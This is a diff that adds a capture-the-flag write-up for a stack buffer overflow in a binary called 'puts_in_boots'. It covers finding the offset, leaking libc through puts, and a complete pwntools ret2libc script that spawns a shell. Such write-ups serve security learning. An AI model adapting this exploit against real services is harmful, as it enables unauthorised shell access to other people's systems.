@@ -129,5 +129,129 @@ The vulnerability in this program lies here:
     }
 ```
 
+It sets the buffer to hold up only 79 bytes and when option 'A' is chosen twice we get a prompt which receives our input and stores it in the buffer and we are allowed to write in 0x100 bytes 
+
+With that there's a buffer overflow since the amount of bytes the buffer can hold up is 79
+
+Now that we know that let us get the offset which is the amount of bytes required to overwrite the instruction pointer
+
+I used gdb-gef for this
+![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/aa8f28e4-0ddc-4e48-8de1-1ab98674cbb3)
+![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/ab4da738-414e-4d78-8846-e146cefc5c56)
+
+The offset is `88`
+
+Now we need a way to exploit this binary to spawn a shell 
+
+Remember that no mitigation is enabled so we can potentially perform ret2shellcode
+
+But I don't feel like going through that since no easy gadget like `jmp rsp; ret`
+![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/8ffd82dc-ce8e-4fe1-9782-90f077230d8a)
+
+So I'll go with ret2libc
+
+Since plt of puts is available during the program execution we can potentially use that to leak the got address of puts
+![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/a2b32b14-91ce-41d2-9899-09a7b10e9f1e)
+
+Here's how my exploit will go:
+- Leak GOT puts from libc
+- Rop to system
+
+In order to do this we need gadgets
+
+And luckily the gadgets needed for the leak is available
+![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/56e07656-a99f-48d0-b14b-ced64e073bcc)
+
+Here's my exploit script
+
+```python
+#!/usr/bin/python3
+from pwn import *
+import warnings
+
+# Allows you to switch between local/GDB/remote from terminal
+def start(argv=[], *a, **kw):
+    if args.GDB:  # Set GDBscript below
+        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
+    elif args.REMOTE:  # ('server', 'port')
+        return remote(sys.argv[1], sys.argv[2], *a, **kw)
+    else:  # Run locally
+        return process([exe] + argv, *a, **kw)
 
 
+# Specify GDB script here (breakpoints etc)
+gdbscript = '''
+init-pwndbg
+continue
+'''.format(**locals())
+
+# Binary filename
+exe = './puts_in_boots'
+# This will automatically get context arch, bits, os etc
+elf = context.binary = ELF(exe, checksec=False)
+# Change logging level to help with debugging (error/warning/info/debug)
+context.log_level = 'info'
+warnings.filterwarnings("ignore", category=BytesWarning, message="Text is not bytes; assuming ASCII, no guarantees.")
+
+# ===========================================================
+#                    EXPLOIT GOES HERE
+# ===========================================================
+
+# Start program
+io = start()
+
+# Load libc library (identified version from server - https://libc.blukat.me)
+# libc = ELF('libc6_2.35-0ubuntu3.1_amd64.so')
+libc = elf.libc
+
+offset = 88
+pop_rdi = 0x00000000004011d6 # pop rdi; ret; 
+ret = 0x000000000040101a # ret; 
+
+
+payload = flat({
+    offset: [
+        pop_rdi,
+        elf.got['puts'],
+        elf.plt['puts'],
+        elf.symbols['main']
+    ]
+})
+
+io.recvuntil('D: Ofcourse I do!')
+io.sendline('A')
+io.sendline('A')
+
+# Leak address
+io.sendline(payload) 
+io.recvline()
+io.recvuntil('ML?')
+io.recvline()
+got_puts = unpack(io.recv()[:6].ljust(8, b"\x00"))
+info("got puts: %#x", got_puts)
+
+# Calculate libc base
+libc.address = got_puts - libc.symbols['puts']
+info("libc_base: %#x", libc.address)
+
+sh = next(libc.search(b'/bin/sh\x00'))
+system = libc.symbols['system']
+info('/bin/sh: %#x', sh)
+info('system: %#x', system)
+
+# Payload to spawn shell
+payload = flat({
+    offset: [
+        pop_rdi,
+        sh,
+        ret,
+        system
+    ]
+})
+
+io.sendline('A')
+io.sendline('A')
+io.sendline(payload)
+
+io.interactive()
+```
